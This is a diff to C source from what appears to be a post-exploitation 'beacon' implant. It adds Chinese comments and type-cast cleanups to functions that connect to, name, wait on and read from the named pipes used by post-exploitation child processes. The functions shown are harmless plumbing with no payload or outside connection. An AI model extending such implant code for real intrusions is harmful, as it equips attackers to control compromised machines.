@@ -1,6 +1,7 @@
 #include "postex_internal.h"
 #include "beacon_crypto.h"
 
+/* 连接 PostEx 子进程创建的命名管道，允许短时间等待管道出现。 */
 BOOL PostExConnectPipe(const CHAR* pipe_name, HANDLE* pipe)
 {
     DWORD mode = PIPE_READMODE_BYTE;
@@ -37,6 +38,7 @@ BOOL PostExConnectPipe(const CHAR* pipe_name, HANDLE* pipe)
     return FALSE;
 }
 
+/* 基于 beacon id、task id 和随机后缀构建唯一 pipe 名。 */
 BOOL PostExBuildPipeName(struct BeaconContext* ctx, UINT32 task_id,
                          CHAR* out, SIZE_T out_size)
 {
@@ -46,11 +48,12 @@ BOOL PostExBuildPipeName(struct BeaconContext* ctx, UINT32 task_id,
     suffix = CryptoRandomU32();
     return _snprintf_s(out, out_size, _TRUNCATE,
                        "\\\\.\\pipe\\beacon_postex_%08lx_%08lx_%08lx",
-                       (unsigned long)ctx->beacon_id,
-                       (unsigned long)task_id,
-                       (unsigned long)suffix) > 0;
+                       (ULONG)ctx->beacon_id,
+                       (ULONG)task_id,
+                       (ULONG)suffix) > 0;
 }
 
+/* 等待 pipe 上出现数据，最多等待 wait_ms。 */
 VOID PostExWaitData(HANDLE pipe, DWORD wait_ms)
 {
     DWORD start;
@@ -68,6 +71,7 @@ VOID PostExWaitData(HANDLE pipe, DWORD wait_ms)
     }
 }
 
+/* 从 pipe 中精确读取 len 字节。 */
 BOOL PostExReadExact(HANDLE pipe, VOID* data, DWORD len)
 {
     BYTE8* p = (BYTE8*)data;
